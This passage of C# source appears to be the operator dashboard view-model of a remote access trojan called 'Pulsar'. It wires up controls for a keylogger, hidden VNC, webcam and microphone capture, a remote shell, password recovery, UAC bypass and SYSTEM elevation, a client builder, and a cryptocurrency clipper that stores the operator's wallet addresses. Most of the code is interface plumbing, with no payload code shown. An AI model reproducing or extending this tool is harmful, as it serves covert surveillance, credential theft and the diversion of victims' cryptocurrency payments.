        public RelayCommand CopyClientEndpointCommand { get; private set; }
        public RelayCommand CopyClientIdCommand { get; private set; }
        public RelayCommand CopyClientUserAtPcCommand { get; private set; }

        // Top-Level Server Utility Window Commands
        public RelayCommand OpenSettingsCommand { get; private set; }
        public RelayCommand OpenBuilderCommand { get; private set; }
        public RelayCommand OpenKeywordsCommand { get; private set; }
        public RelayCommand OpenAboutCommand { get; private set; }

        // Navigation, Search, & Tab Commands
        public RelayCommand<string> NavigateTabCommand { get; private set; }
        public RelayCommand RefreshAllCommand { get; private set; }
        public RelayCommand ClearSearchCommand { get; private set; }
        public RelayCommand ClearOfflineClientsCommand { get; private set; }
        public RelayCommand DeleteSelectedOfflineClientCommand { get; private set; }
        public RelayCommand RefreshOfflineClientsCommand { get; private set; }
        public RelayCommand MarkAllNotificationsReadCommand { get; private set; }
        public RelayCommand ClearSelectedNotificationCommand { get; private set; }
        public RelayCommand ClearAllNotificationsCommand { get; private set; }
        public RelayCommand SaveCryptoConfigurationCommand { get; private set; }
        public RelayCommand AddAutoTaskCommand { get; private set; }
        public RelayCommand DeleteSelectedAutoTaskCommand { get; private set; }
        public RelayCommand ClearSelectionCommand { get; private set; }
        public RelayCommand ClearDebugLogsCommand { get; private set; }
        public RelayCommand DismissFeedbackBannerCommand { get; private set; }
        public RelayCommand ResetConfirmationsCommand { get; private set; }
        public RelayCommand ToggleThemeCommand { get; private set; }

        private void InitializeCommands()
        {
            // System Control (Red Glass Card)
            DisconnectCommand = new RelayCommand(ExecuteDisconnect, CanExecuteSystemControl);
            ReconnectCommand = new RelayCommand(ExecuteReconnect, CanExecuteSystemControl);
            RestartCommand = new RelayCommand(ExecuteRestart, CanExecuteSystemControl);
            ShutdownCommand = new RelayCommand(ExecuteShutdown, CanExecuteSystemControl);
            StandbyCommand = new RelayCommand(ExecuteStandby, CanExecuteSystemControl);
            LockscreenCommand = new RelayCommand(ExecuteLockscreen, CanExecuteSystemControl);
            ShowMessageBoxCommand = new RelayCommand(ExecuteShowMessageBox, CanExecuteSystemControl);
            ExecuteCommandCommand = new RelayCommand(ExecuteQuickCommand, CanExecuteSystemControl);
            UninstallCommand = new RelayCommand(ExecuteUninstall, CanExecuteSystemControl);

            // Tool Launch (Blue Glass Card)
            QuickMicrophoneCommand = new RelayCommand(ExecuteQuickMicrophone, CanExecuteQuickAction);
            QuickRemoteDesktopCommand = new RelayCommand(ExecuteQuickRemoteDesktop, CanExecuteQuickAction);
            QuickWebcamCommand = new RelayCommand(ExecuteQuickWebcam, CanExecuteQuickAction);
            QuickKeyloggerCommand = new RelayCommand(ExecuteQuickKeylogger, CanExecuteQuickAction);
            QuickFileManagerCommand = new RelayCommand(ExecuteQuickFileManager, CanExecuteQuickAction);
            QuickRemoteShellCommand = new RelayCommand(ExecuteQuickRemoteShell, CanExecuteQuickAction);
            QuickFileExplorerCommand = new RelayCommand(ExecuteQuickFileManager, CanExecuteQuickAction);
            QuickRemoteExecutionCommand = new RelayCommand(ExecuteQuickRemoteExecution, CanExecuteQuickAction);
            QuickHvncCommand = new RelayCommand(ExecuteQuickHvnc, CanExecuteQuickAction);

            // Additional Admin & Monitoring Modules
            OpenSystemInfoCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.SystemInformation, "System Information"), CanExecuteQuickAction);
            OpenTaskManagerCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.TaskManager, "Task Manager"), CanExecuteQuickAction);
            OpenStartupManagerCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.StartupManager, "Startup Manager"), CanExecuteQuickAction);
            OpenRegistryEditorCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.RegistryEditor, "Registry Editor"), CanExecuteQuickAction);
            OpenTcpConnectionsCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.TcpConnections, "TCP Connections"), CanExecuteQuickAction);
            OpenReverseProxyCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.ReverseProxy, "Reverse Proxy"), CanExecuteQuickAction);
            OpenPasswordRecoveryCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.PasswordRecovery, "Password Recovery"), CanExecuteQuickAction);
            OpenSystemAudioCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.SystemAudio, "System Audio"), CanExecuteQuickAction);
            OpenRemoteChatCommand = new RelayCommand(() => LaunchToolWithoutButton(ClientToolType.RemoteChat, "Remote Chat"), CanExecuteQuickAction);

            // Maintenance & Elevation
            DeleteTempDirectoryCommand = new RelayCommand(ExecuteDeleteTempDirectory, CanExecuteSystemControl);
            AskElevateCommand = new RelayCommand(() => ExecuteDirectConfirmedMessage("Ask UAC Elevation", ActionRiskLevel.High, "Prompts the remote user with a UAC elevation dialog.", "Client restarts elevated if approved.", new DoAskElevate()), CanExecuteSystemControl);
            UacBypassCommand = new RelayCommand(() => ExecuteDirectConfirmedMessage("UAC Bypass", ActionRiskLevel.Critical, "Attempts privilege elevation bypass on the remote client.", "May restart the client process with elevated privileges.", new DoUACBypass()), CanExecuteSystemControl);
            ElevateSystemCommand = new RelayCommand(() => ExecuteDirectConfirmedMessage("Elevate to SYSTEM", ActionRiskLevel.Critical, "Attempts to elevate the client context to NT AUTHORITY\\SYSTEM.", "Client restarts under SYSTEM if elevated privileges exist.", new DoElevateSystem()), CanExecuteSystemControl);
            DeElevateCommand = new RelayCommand(() => ExecuteDirectConfirmedMessage("De-Elevate", ActionRiskLevel.High, "Drops the client back to standard user privileges.", "Recoverable via re-elevation.", new DoDeElevate()), CanExecuteSystemControl);

            // Clipboard Copy
            CopyClientIpCommand = new RelayCommand(() => CopySelectedField("Public IP", SelectedClient?.Value?.PublicIP), () => !string.IsNullOrWhiteSpace(SelectedClient?.Value?.PublicIP));
            CopyClientEndpointCommand = new RelayCommand(() => CopySelectedField("Endpoint", SelectedClient?.EndPoint?.ToString()), () => SelectedClient?.EndPoint != null);
            CopyClientIdCommand = new RelayCommand(() => CopySelectedField("Client ID", SelectedClient?.Value?.Id), () => !string.IsNullOrWhiteSpace(SelectedClient?.Value?.Id));
            CopyClientUserAtPcCommand = new RelayCommand(() => CopySelectedField("User@Host", FormatClientDisplay(SelectedClient)), () => SelectedClient != null);

            // Server Utility Windows
            OpenSettingsCommand = new RelayCommand(() => LaunchServerWindow(ServerWindowType.Settings, "Settings"));
            OpenBuilderCommand = new RelayCommand(() => LaunchServerWindow(ServerWindowType.Builder, "Client Builder"));
            OpenKeywordsCommand = new RelayCommand(() => LaunchServerWindow(ServerWindowType.Keywords, "Notification Keywords"));
            OpenAboutCommand = new RelayCommand(() => LaunchServerWindow(ServerWindowType.About, "About Pulsar"));

            // Navigation, Search & Tabs
            NavigateTabCommand = new RelayCommand<string>(ExecuteNavigateTab);
            RefreshAllCommand = new RelayCommand(ExecuteRefreshAll);
            ClearSearchCommand = new RelayCommand(() => SearchQuery = string.Empty, () => HasSearchQuery);
            ClearOfflineClientsCommand = new RelayCommand(ExecuteClearOfflineClients);
            DeleteSelectedOfflineClientCommand = new RelayCommand(ExecuteDeleteSelectedOfflineClient, () => SelectedOfflineClient != null);
            RefreshOfflineClientsCommand = new RelayCommand(() =>
            {
                _uiDispatch(ReloadOfflineClients);
                RefreshAnalyticsSnapshots();
                SetFeedbackBanner("✓ Offline client records refreshed.", ActionExecutionState.Success);
            });
            MarkAllNotificationsReadCommand = new RelayCommand(ExecuteMarkAllNotificationsRead);
            ClearSelectedNotificationCommand = new RelayCommand(ExecuteClearSelectedNotification, () => SelectedNotification != null);
            ClearAllNotificationsCommand = new RelayCommand(ExecuteClearAllNotifications);
            SaveCryptoConfigurationCommand = new RelayCommand(ExecuteSaveCryptoConfiguration);
            AddAutoTaskCommand = new RelayCommand(ExecuteAddAutoTask);
            DeleteSelectedAutoTaskCommand = new RelayCommand(ExecuteDeleteSelectedAutoTask, () => SelectedAutoTask != null);

            ClearSelectionCommand = new RelayCommand(() => SelectedClient = null, () => SelectedClient != null);
            ClearDebugLogsCommand = new RelayCommand(() => _uiDispatch(() => DebugLogs.Clear()));
            DismissFeedbackBannerCommand = new RelayCommand(() =>
            {
                FeedbackBannerText = string.Empty;
                FeedbackBannerState = ActionExecutionState.Ready;
            });
            ResetConfirmationsCommand = new RelayCommand(ExecuteResetConfirmations);
            ToggleThemeCommand = new RelayCommand(ExecuteToggleTheme);
        }

        private bool CanExecuteSystemControl()
        {
            return SelectedClient != null && SelectedClient.Connected && SelectedClient.Identified;
        }

        private bool CanExecuteQuickAction()
        {
            return SelectedClient != null && SelectedClient.Connected;
        }

        #region System Control Handlers (Routed via ClientOperationService)

        private void ExecuteDisconnect()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Disconnect,
                "Disconnect",
                ActionRiskLevel.High,
                allowDontAskAgain: true,
                consequence: "Terminates the active session with this client.",
                recoverability: "Recoverable — client can reconnect automatically if configured.",
                feedback: DisconnectFeedback);
        }

        private void ExecuteReconnect()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Reconnect,
                "Reconnect",
                ActionRiskLevel.High,
                allowDontAskAgain: true,
                consequence: "Instructs the client to drop and re-establish its TCP session.",
                recoverability: "Recoverable — session resumes after reconnect delay.",
                feedback: ReconnectFeedback);
        }

        private void ExecuteRestart()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Restart,
                "Restart",
                ActionRiskLevel.Critical,
                allowDontAskAgain: false,
                consequence: "Immediately reboots the remote machine and closes active user apps.",
                recoverability: "Session returns after OS reboot if persistence is enabled.",
                feedback: RestartFeedback);
        }

        private void ExecuteShutdown()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Shutdown,
                "Shutdown",
                ActionRiskLevel.Critical,
                allowDontAskAgain: false,
                consequence: "Powers off the remote machine completely.",
                recoverability: "Not remotely recoverable until the machine is powered back on.",
                feedback: ShutdownFeedback);
        }

        private void ExecuteStandby()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Standby,
                "Standby",
                ActionRiskLevel.High,
                allowDontAskAgain: true,
                consequence: "Puts the remote machine into sleep/standby mode.",
                recoverability: "Session returns when the remote machine wakes up.",
                feedback: StandbyFeedback);
        }

        private void ExecuteLockscreen()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Lockscreen,
                "Lockscreen",
                ActionRiskLevel.High,
                allowDontAskAgain: true,
                consequence: "Locks the active Windows desktop session.",
                recoverability: "Recoverable — client connection stays active.",
                feedback: LockscreenFeedback);
        }

        private void ExecuteUninstall()
        {
            ExecuteConfirmedOperation(
                ClientOperation.Uninstall,
                "Uninstall Client",
                ActionRiskLevel.Critical,
                allowDontAskAgain: false,
                consequence: "Permanently removes the client binary and persistence entries from the host.",
                recoverability: "Irreversible — requires re-deployment to regain access.",
                feedback: UninstallFeedback);
        }

        private void ExecuteShowMessageBox()
        {
            var client = SelectedClient;
            if (!CanExecuteSystemControl() || client?.Value == null)
            {
                return;
            }

            var input = _dialogService.ShowMessageBoxInput(FormatClientDisplay(client));
            if (input == null || !input.Confirmed)
            {
                return;
            }

            DispatchClientOperation(
                client,
                new ClientOperationRequest
                {
                    ClientId = client.Value.Id,
                    Operation = ClientOperation.MessageBox,
                    Caption = input.Caption,
                    Text = input.Text,
                    Button = input.Button,
                    Icon = input.Icon
                },
                "Message Box",
                MessageBoxFeedback);
        }

        private void ExecuteQuickCommand()
        {
            var client = SelectedClient;
            if (!CanExecuteSystemControl() || client?.Value == null)
            {
                return;
            }

            var input = _dialogService.ShowQuickCommandInput(FormatClientDisplay(client));
            if (input == null || !input.Confirmed)
            {
                return;
            }

            DispatchClientOperation(
                client,
                new ClientOperationRequest
                {
                    ClientId = client.Value.Id,
                    Operation = ClientOperation.QuickCommand,
                    Host = input.Host,
                    Command = input.Command
                },
                "Execute Command",
                ExecuteCommandFeedback);
        }

        private void ExecuteDeleteTempDirectory()
        {
            ExecuteDirectConfirmedMessage(
                "Delete Temp Directory",
                ActionRiskLevel.High,
                "Deletes all files inside the client's temp directory (keylogger logs, dropped temp files, DLLs).",
                "Deleted temp artifacts cannot be recovered.",
                new DoClearTempDirectory());
        }

        private void ExecuteDirectConfirmedMessage(
            string actionName,
            ActionRiskLevel riskLevel,
            string consequence,
            string recoverability,
            IMessage message)
        {
            var client = SelectedClient;
            if (!CanExecuteSystemControl() || client == null || message == null)
            {
                return;
            }

            var confirmation = _dialogService.ShowConfirmation(new ActionConfirmationRequest
            {
                Title = $"Confirm {actionName}",
                ActionName = actionName,
                ClientDisplay = FormatClientDisplay(client),
                ClientEndpoint = client.EndPoint?.ToString() ?? client.Value?.PublicIP,
                Consequence = consequence,
                Recoverability = recoverability,
                RiskLevel = riskLevel,
                AllowDontAskAgain = false
            });

            if (confirmation == null || !confirmation.Confirmed)
            {
                return;
            }

            if (client.TrySend(message))
            {
                SetFeedbackBanner($"✓ {actionName} queued for {FormatClientDisplay(client)}", ActionExecutionState.Success);
                AppendAuditLog($"[WPF panel] Sent {actionName} ({message.GetType().Name}) to {FormatClientDisplay(client)}", "normal");
            }
            else
            {
                SetFeedbackBanner($"✗ {actionName} rejected: client cannot accept messages.", ActionExecutionState.Error);
                AppendAuditLog($"[WPF panel] Failed to send {actionName} to {FormatClientDisplay(client)}", "warning");
            }
        }

        private void ExecuteConfirmedOperation(
            ClientOperation operation,
            string actionName,
            ActionRiskLevel riskLevel,
            bool allowDontAskAgain,
            string consequence,
            string recoverability,
            ActionFeedbackViewModel feedback)
        {
            var client = SelectedClient;
            if (!CanExecuteSystemControl() || client?.Value == null)
            {
                return;
            }

            bool suppressAllowed = riskLevel != ActionRiskLevel.Critical && allowDontAskAgain;
            bool requiresPrompt = !suppressAllowed || !_sessionSuppressedConfirmations.Contains(operation);

            if (requiresPrompt)
            {
                var confirmation = _dialogService.ShowConfirmation(new ActionConfirmationRequest
                {
                    Title = $"Confirm {actionName}",
                    ActionName = actionName,
                    ClientDisplay = FormatClientDisplay(client),
                    ClientEndpoint = client.EndPoint?.ToString() ?? client.Value.PublicIP,
                    Consequence = consequence,
                    Recoverability = recoverability,
                    RiskLevel = riskLevel,
                    AllowDontAskAgain = suppressAllowed
                });

                if (confirmation == null || !confirmation.Confirmed)
                {
                    return;
                }

                if (suppressAllowed && confirmation.DontAskAgain)
                {
                    _sessionSuppressedConfirmations.Add(operation);
                }
            }

            DispatchClientOperation(
                client,
                new ClientOperationRequest
                {
                    ClientId = client.Value.Id,
                    Operation = operation
                },
                actionName,
                feedback);
        }

        private void DispatchClientOperation(
            Client client,
            ClientOperationRequest request,
            string actionName,
            ActionFeedbackViewModel feedback)
        {
            feedback.SetProcessing($"Sending {actionName}...");
            SetFeedbackBanner($"⏳ Queuing {actionName} for {FormatClientDisplay(client)}...", ActionExecutionState.Processing);

            try
            {
                var result = _clientOperations.Execute(request, "wpf panel");
                if (result.Accepted)
                {
                    string successMsg = $"✓ {actionName} queued for {FormatClientDisplay(client)}";
                    feedback.SetSuccess("Sent");
                    SetFeedbackBanner(successMsg, ActionExecutionState.Success);
                }
                else
                {
                    string reason = string.IsNullOrWhiteSpace(result.Error) ? result.Status.ToString() : result.Error;
                    string errorMsg = $"✗ {actionName} failed: {reason}";
                    feedback.SetError(reason);
                    SetFeedbackBanner(errorMsg, ActionExecutionState.Error);
                }
            }
            catch (Exception ex)
            {
                feedback.SetError(ex.Message);
                SetFeedbackBanner($"✗ {actionName} error: {ex.Message}", ActionExecutionState.Error);
                AppendAuditLog($"[WPF panel] {actionName} threw {ex.GetType().Name}: {ex.Message}", "error");
            }
        }

        #endregion

        #region Tool & Window Launch Handlers

        private void ExecuteQuickMicrophone() => LaunchTool(ClientToolType.Microphone, "Microphone", QuickMicrophoneFeedback);
        private void ExecuteQuickRemoteDesktop() => LaunchTool(ClientToolType.RemoteDesktop, "Remote Desktop", QuickRemoteDesktopFeedback);
        private void ExecuteQuickWebcam() => LaunchTool(ClientToolType.Webcam, "Webcam", QuickWebcamFeedback);
        private void ExecuteQuickKeylogger() => LaunchTool(ClientToolType.Keylogger, "Keylogger", QuickKeyloggerFeedback);
        private void ExecuteQuickFileManager() => LaunchTool(ClientToolType.FileManager, "File Manager", QuickFileManagerFeedback);
        private void ExecuteQuickRemoteShell() => LaunchTool(ClientToolType.RemoteShell, "Remote Shell", QuickRemoteShellFeedback);
        private void ExecuteQuickRemoteExecution() => LaunchTool(ClientToolType.RemoteExecution, "Remote Execution", QuickRemoteExecutionFeedback);
        private void ExecuteQuickHvnc() => LaunchTool(ClientToolType.Hvnc, "HVNC", QuickHvncFeedback);

        private void LaunchTool(ClientToolType tool, string toolName, ActionFeedbackViewModel feedback)
        {
            var client = SelectedClient;
            if (!CanExecuteQuickAction() || client == null)
            {
                return;
            }

            feedback?.SetProcessing($"Launching {toolName}...");
            try
            {
                _toolLauncher.Launch(tool, client);
                feedback?.SetSuccess("Opened");
                SetFeedbackBanner($"✓ Launched {toolName} for {FormatClientDisplay(client)}", ActionExecutionState.Success);
                AppendAuditLog($"[Tool launch] Opened {toolName} for {FormatClientDisplay(client)}", "normal");
            }
            catch (Exception ex)
            {
                feedback?.SetError(ex.Message);
                SetFeedbackBanner($"✗ Failed to launch {toolName}: {ex.Message}", ActionExecutionState.Error);
                AppendAuditLog($"[Tool launch] {toolName} failed: {ex.Message}", "error");
            }
        }

        private void LaunchToolWithoutButton(ClientToolType tool, string toolName)
        {
            LaunchTool(tool, toolName, null);
        }

        private void LaunchServerWindow(ServerWindowType windowType, string windowTitle)
        {
            try
            {
                _serverWindowLauncher.Launch(windowType, _listenServer);
                AppendAuditLog($"[Menu] Opened {windowTitle}.", "normal");
            }
            catch (Exception ex)
            {
                SetFeedbackBanner($"✗ Failed to open {windowTitle}: {ex.Message}", ActionExecutionState.Error);
                AppendAuditLog($"[Menu] Opening {windowTitle} failed: {ex.Message}", "error");
            }
        }

        private void CopySelectedField(string label, string value)
        {
            if (string.IsNullOrWhiteSpace(value))
            {
                return;
            }

            try
            {
                _clipboardSetter(value);
                SetFeedbackBanner($"✓ Copied {label} to clipboard.", ActionExecutionState.Success);
            }
            catch (Exception ex)
            {
                SetFeedbackBanner($"✗ Could not copy {label}: {ex.Message}", ActionExecutionState.Error);
            }
        }

        #endregion

        #region Tab Persistence & Management Handlers

        private void LoadPersistedTabState()
        {
            LoadCryptoConfiguration();
            LoadAutoTasks();
            LoadNotifications();
        }

        private void ExecuteNavigateTab(string tabIndexParam)
        {
            if (int.TryParse(tabIndexParam, out int index))
            {
                SelectedTabIndex = index;
            }
        }

        private void ExecuteRefreshAll()
        {
            RefreshClientLists();
            LoadPersistedTabState();
            SetFeedbackBanner("✓ Dashboard data refreshed.", ActionExecutionState.Success);
        }

        private void ExecuteDeleteSelectedOfflineClient()
        {
            var record = SelectedOfflineClient;
            if (record == null)
            {
                return;
            }

            try
            {
                if (!string.IsNullOrWhiteSpace(record.ClientId))
                {
                    OfflineClientRepository.RemoveOfflineClients(new[] { record.ClientId });
                }

                _uiDispatch(() =>
                {
                    OfflineClients.Remove(record);
                    SelectedOfflineClient = null;
                });

                RefreshAnalyticsSnapshots();
                SetFeedbackBanner($"✓ Removed offline record {record.ClientId}.", ActionExecutionState.Success);
                AppendAuditLog($"Deleted offline client record {record.ClientId}.", "normal");
            }
            catch (Exception ex)
            {
                SetFeedbackBanner($"✗ Error deleting offline record: {ex.Message}", ActionExecutionState.Error);
                AppendAuditLog($"Error deleting offline record: {ex.Message}", "error");
            }
        }

        private void ExecuteClearOfflineClients()
        {
            try
            {
                _uiDispatch(() =>
                {
                    OfflineClients.Clear();
                    SelectedOfflineClient = null;
                });
                OfflineClientRepository.ClearOfflineClients();
                RefreshAnalyticsSnapshots();
                SetFeedbackBanner("✓ Offline client records cleared.", ActionExecutionState.Success);
                AppendAuditLog("Cleared offline client repository.", "normal");
            }
            catch (Exception ex)
            {
                SetFeedbackBanner($"✗ Error clearing offline clients: {ex.Message}", ActionExecutionState.Error);
                AppendAuditLog($"Error clearing offline clients: {ex.Message}", "error");
            }
        }

        private void LoadNotifications()
        {
            try
            {
                _uiDispatch(() => Notifications.Clear());
                if (!File.Exists(NotificationsFilePath))
                {
                    return;
                }

                string json = File.ReadAllText(NotificationsFilePath);
                if (string.IsNullOrWhiteSpace(json))
                {
                    return;
                }

                var entries = JsonConvert.DeserializeObject<List<NotificationEntry>>(json);
                if (entries == null)
                {
                    return;
                }

                _uiDispatch(() =>
                {
                    foreach (var entry in entries.TakeLast(MaxNotificationEntries))
                    {
                        if (entry != null)
                        {
                            Notifications.Add(entry);
                        }
                    }
                    OnPropertyChanged(nameof(NotificationStatusText));
                });
            }
            catch (Exception ex)
            {
                AppendAuditLog($"Error loading notifications: {ex.Message}", "warning");
            }
        }

        private void SaveNotifications()
        {
            try
            {
                Directory.CreateDirectory(_dataDirectory);
                var snapshot = Notifications.TakeLast(MaxNotificationEntries).ToList();
                File.WriteAllText(NotificationsFilePath, JsonConvert.SerializeObject(snapshot, Formatting.Indented));
            }
            catch (Exception ex)
            {
                AppendAuditLog($"Error saving notifications: {ex.Message}", "error");
            }
        }

        private void ExecuteMarkAllNotificationsRead()
        {
            _uiDispatch(() =>
            {
                foreach (var entry in Notifications)
                {
                    if (entry != null)
                    {
                        entry.IsRead = true;
                    }
                }
                OnPropertyChanged(nameof(NotificationStatusText));
            });

            SaveNotifications();
            SetFeedbackBanner("✓ All notifications marked as read.", ActionExecutionState.Success);
        }

        private void ExecuteClearSelectedNotification()
        {
            var selected = SelectedNotification;
            if (selected == null)
            {
                return;
            }

            _uiDispatch(() =>
            {
                Notifications.Remove(selected);
                SelectedNotification = null;
                OnPropertyChanged(nameof(NotificationStatusText));
            });

            SaveNotifications();
            SetFeedbackBanner("✓ Removed selected notification.", ActionExecutionState.Success);
        }

        private void ExecuteClearAllNotifications()
        {
            _uiDispatch(() =>
            {
                Notifications.Clear();
                SelectedNotification = null;
                OnPropertyChanged(nameof(NotificationStatusText));
            });

            SaveNotifications();
            SetFeedbackBanner("✓ All notifications cleared.", ActionExecutionState.Success);
        }

        private void LoadCryptoConfiguration()
        {
            try
            {
                if (!File.Exists(CryptoAddressesFilePath))
                {
                    return;
                }

                string json = File.ReadAllText(CryptoAddressesFilePath);
                if (!FrmMain.TryParseCryptoAddressConfiguration(json, out var addresses, out bool clipperEnabled))
                {
                    return;
                }

                _uiDispatch(() =>
                {
                    BitcoinAddress = addresses.TryGetValue("BTC", out var btc) ? btc : string.Empty;
                    EthereumAddress = addresses.TryGetValue("ETH", out var eth) ? eth : string.Empty;
                    LitecoinAddress = addresses.TryGetValue("LTC", out var ltc) ? ltc : string.Empty;
                    MoneroAddress = addresses.TryGetValue("XMR", out var xmr) ? xmr : string.Empty;
                    SolanaAddress = addresses.TryGetValue("SOL", out var sol) ? sol : string.Empty;
                    DashAddress = addresses.TryGetValue("DASH", out var dash) ? dash : string.Empty;
                    XrpAddress = addresses.TryGetValue("XRP", out var xrp) ? xrp : string.Empty;
                    TronAddress = addresses.TryGetValue("TRX", out var trx) ? trx : string.Empty;
                    BitcoinCashAddress = addresses.TryGetValue("BCH", out var bch) ? bch : string.Empty;
                    CryptoClipperEnabled = clipperEnabled;
                });
            }
            catch (Exception ex)
            {
                AppendAuditLog($"Error loading crypto configuration: {ex.Message}", "warning");
            }
        }

        private void ExecuteSaveCryptoConfiguration()
        {
            try
            {
                Directory.CreateDirectory(_dataDirectory);
                var payload = new Dictionary<string, object>
                {
                    ["Addresses"] = new Dictionary<string, string>
                    {
                        ["BTC"] = BitcoinAddress?.Trim() ?? string.Empty,
                        ["LTC"] = LitecoinAddress?.Trim() ?? string.Empty,
                        ["ETH"] = EthereumAddress?.Trim() ?? string.Empty,
                        ["XMR"] = MoneroAddress?.Trim() ?? string.Empty,
                        ["SOL"] = SolanaAddress?.Trim() ?? string.Empty,
                        ["DASH"] = DashAddress?.Trim() ?? string.Empty,
                        ["XRP"] = XrpAddress?.Trim() ?? string.Empty,
                        ["TRX"] = TronAddress?.Trim() ?? string.Empty,
                        ["BCH"] = BitcoinCashAddress?.Trim() ?? string.Empty
                    },
                    ["ClipperEnabled"] = CryptoClipperEnabled
                };

                File.WriteAllText(CryptoAddressesFilePath, JsonConvert.SerializeObject(payload, Formatting.Indented));
                SetFeedbackBanner("✓ Crypto clipper configuration saved.", ActionExecutionState.Success);
                AppendAuditLog("Saved crypto_addresses.json configuration.", "normal");
            }
            catch (Exception ex)
            {
                SetFeedbackBanner($"✗ Failed to save crypto configuration: {ex.Message}", ActionExecutionState.Error);
                AppendAuditLog($"Failed to save crypto configuration: {ex.Message}", "error");
            }
        }

        private void LoadAutoTasks()
        {
            try
            {
                _uiDispatch(() => AutoTasks.Clear());
                if (!File.Exists(AutoTasksFilePath))
                {
                    return;
                }

                string json = File.ReadAllText(AutoTasksFilePath);
                if (string.IsNullOrWhiteSpace(json))
                {
                    return;
                }

                var tasks = JsonConvert.DeserializeObject<List<AutoTask>>(json);
                if (tasks == null)
                {
                    return;
                }

                _uiDispatch(() =>
                {
                    foreach (var task in tasks)
                    {
                        if (task != null)
                        {
                            AutoTasks.Add(task);
                        }
                    }
                });
            }
            catch (Exception ex)
            {
                AppendAuditLog($"Error loading auto tasks: {ex.Message}", "warning");
            }
        }

        private void SaveAutoTasks()
        {
            try
            {
                Directory.CreateDirectory(_dataDirectory);
                File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(AutoTasks.ToList(), Formatting.Indented));
            }
            catch (Exception ex)
            {
                AppendAuditLog($"Error saving auto tasks: {ex.Message}", "error");
            }
        }

        private void ExecuteAddAutoTask()
        {
            var input = _dialogService.ShowAutoTaskInput();
            if (input == null || !input.Confirmed || string.IsNullOrWhiteSpace(input.Title))
            {
                return;
            }

            var task = new AutoTask
            {
                Title = input.Title.Trim(),
                Param1 = input.Param1 ?? string.Empty,
                Param2 = input.Param2 ?? string.Empty,
                Identifier = Guid.NewGuid().ToString("N"),
                ExecutionMode = input.ExecutionMode
            };

            _uiDispatch(() => AutoTasks.Add(task));
            SaveAutoTasks();
            SetFeedbackBanner($"✓ Added auto task \"{task.Title}\".", ActionExecutionState.Success);
            AppendAuditLog($"Added auto task: {task.Title} ({task.ExecutionMode}).", "normal");
        }

        private void ExecuteDeleteSelectedAutoTask()
        {
            var task = SelectedAutoTask;
            if (task == null)
            {
                return;
            }

            _uiDispatch(() =>
            {
                AutoTasks.Remove(task);
                SelectedAutoTask = null;
            });

            SaveAutoTasks();
            SetFeedbackBanner($"✓ Removed auto task \"{task.Title}\".", ActionExecutionState.Success);
            AppendAuditLog($"Removed auto task: {task.Title}.", "normal");
        }

        private void ExecuteResetConfirmations()
        {
            _sessionSuppressedConfirmations.Clear();
            SetFeedbackBanner("✓ Session confirmation prompts restored.", ActionExecutionState.Success);
            AppendAuditLog("Reset suppressed session confirmations.", "normal");
        }

        private void ExecuteToggleTheme()
        {
            var next = ThemeService.Instance.CurrentTheme == ThemeService.Theme.Dark
                ? ThemeService.Theme.Light
                : ThemeService.Theme.Dark;
            ThemeService.Instance.CurrentTheme = next;
            IsDarkTheme = next == ThemeService.Theme.Dark;
        }

        #endregion

        private void SetFeedbackBanner(string text, ActionExecutionState state)
        {
            _uiDispatch(() =>
            {
                FeedbackBannerState = state;
                FeedbackBannerText = text ?? string.Empty;
            });
        }

        public void ReportRuntimeStatus(string text, bool success)
        {
            SetFeedbackBanner(text, success ? ActionExecutionState.Success : ActionExecutionState.Error);
            AppendAuditLog(text, success ? "normal" : "error");
        }

        private void AppendAuditLog(string message, string level)
        {
            if (string.IsNullOrWhiteSpace(message))
            {
                return;
            }

            string tag = string.IsNullOrWhiteSpace(level) ? "INFO" : level.ToUpperInvariant();
            string entry = $"[{DateTime.Now:HH:mm:ss}] [{tag}] {message}";
            System.Diagnostics.Debug.WriteLine(entry);

            _uiDispatch(() =>
            {
                DebugLogs.Insert(0, entry);
                while (DebugLogs.Count > MaxDebugLogEntries)
                {
                    DebugLogs.RemoveAt(DebugLogs.Count - 1);
                }
            });
        }

        private static string FormatClientDisplay(Client client)
        {
            if (client?.Value == null)
            {
                return client?.EndPoint?.ToString() ?? "unknown client";
            }

            if (!string.IsNullOrWhiteSpace(client.Value.Username) && !string.IsNullOrWhiteSpace(client.Value.PcName))
            {
                return $"{client.Value.Username}@{client.Value.PcName}";
            }

            if (!string.IsNullOrWhiteSpace(client.Value.Username))
            {
                return client.Value.Username;
            }

            return client.EndPoint?.ToString() ?? client.Value.Id ?? "unknown client";
        }

        private void RefreshCommandStates()
        {
            DisconnectCommand?.RaiseCanExecuteChanged();
            ReconnectCommand?.RaiseCanExecuteChanged();
            RestartCommand?.RaiseCanExecuteChanged();
            ShutdownCommand?.RaiseCanExecuteChanged();
            StandbyCommand?.RaiseCanExecuteChanged();
            LockscreenCommand?.RaiseCanExecuteChanged();
            ShowMessageBoxCommand?.RaiseCanExecuteChanged();
            ExecuteCommandCommand?.RaiseCanExecuteChanged();
            UninstallCommand?.RaiseCanExecuteChanged();

            QuickMicrophoneCommand?.RaiseCanExecuteChanged();
            QuickRemoteDesktopCommand?.RaiseCanExecuteChanged();
            QuickWebcamCommand?.RaiseCanExecuteChanged();
            QuickKeyloggerCommand?.RaiseCanExecuteChanged();
            QuickFileManagerCommand?.RaiseCanExecuteChanged();
            QuickRemoteShellCommand?.RaiseCanExecuteChanged();
            QuickFileExplorerCommand?.RaiseCanExecuteChanged();
            QuickRemoteExecutionCommand?.RaiseCanExecuteChanged();
            QuickHvncCommand?.RaiseCanExecuteChanged();

            OpenSystemInfoCommand?.RaiseCanExecuteChanged();
            OpenTaskManagerCommand?.RaiseCanExecuteChanged();
            OpenStartupManagerCommand?.RaiseCanExecuteChanged();
            OpenRegistryEditorCommand?.RaiseCanExecuteChanged();
